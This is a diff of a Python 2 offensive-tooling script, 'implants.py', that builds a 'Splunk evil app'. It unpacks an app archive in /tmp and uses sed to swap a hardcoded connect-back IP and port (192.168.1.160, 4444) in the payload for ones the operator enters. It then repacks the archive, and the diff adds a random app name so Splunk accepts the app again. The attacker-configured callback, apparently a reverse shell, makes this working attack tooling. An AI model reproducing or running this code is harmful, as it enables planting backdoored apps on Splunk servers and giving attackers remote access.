@@ -1,12 +1,17 @@
 #!/usr/bin/env python
 # implants.py - core file for implants
-# 
+#
+# current:
+#   - splunk app
+#
 
 # --- imports ---
 import subprocess
 import re
 import sys
 import requests
+import random
+import string
 
 # from files if needed
 sys.path.append('files')
@@ -105,16 +110,16 @@ def implant_local():
   elif choice == 'b':
     print OKGREEN + '  [+] Splunk evil app (lin)' + ENDC
     print ''
-    splunk_evil_app()   
+    splunk_evil_app()
 
   else:
     print FAIL + '[-] wrong. try again next year.\n' + ENDC
     core.menu() # starter() # goto 'main()'
 
 
-## --- 
+## ---
 # our super implants:
-# 
+#
 
 def splunk_evil_app():
   print OKGREEN
@@ -133,18 +138,24 @@ def splunk_evil_app():
     print '  [+] app should be ready in /tmp/apka2.tgz'
     print '  [+] preparing...' + ENDC
 
-    lhost = raw_input('  connecback to[IP]> ')
-    lport = raw_input('  connctback to[port] ')
+    random1 = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(32)])
+    appname = random1 # new appname cuz Splunk don't like the same :C
+
+    lhost = raw_input('    connecback to[IP]> ')
+    lport = raw_input('    connctback to[port] ')
+
 
     rewriteapp = "cd /tmp; tar zxvf /tmp/apka2.tgz;"
     rewriteapp += "cd /tmp/apka2/bin;sed -e 's/192.168.1.160/" + lhost + "/g' apka2.py > apkanew.py;"
     rewriteapp += "sed -e 's/4444/" + lport + "/g' apkanew.py > apkafinal.py;"
+    rewriteapp += "cd /tmp/apka2/default/;sed -e 's/\[apka2/\[" + appname + "/g' commands.conf > commands.new;"
+    rewriteapp += "rm /tmp/apka2/default/commands.conf; mv /tmp/apka2/default/commands.new /tmp/apka2/default/commands.conf;"
     rewriteapp += "rm /tmp/apka2/bin/apka2.py /tmp/apka2/bin/apkanew.py; cd /tmp; tar cf /tmp/apkash.tgz ./apka2/;"
     rewriteapp += "ls -la /tmp/apkash.tgz"
 
     subprocess.call([rewriteapp], shell=True)
-
     print OKGREEN + '  [+] Splunk app rewrited: /tmp/apkash.tgz\n' + ENDC
+    print appname
 
 
   elif get_or_have == '2':
@@ -153,11 +164,7 @@ def splunk_evil_app():
   else:
    print FAIL + '  [-] Maybe later ;[\n' + ENDC
 
-  
-  
-  
+
   print OKGREEN + '  [+] Creating Splunk evil app - finished.\n' + ENDC
-
-
 
 
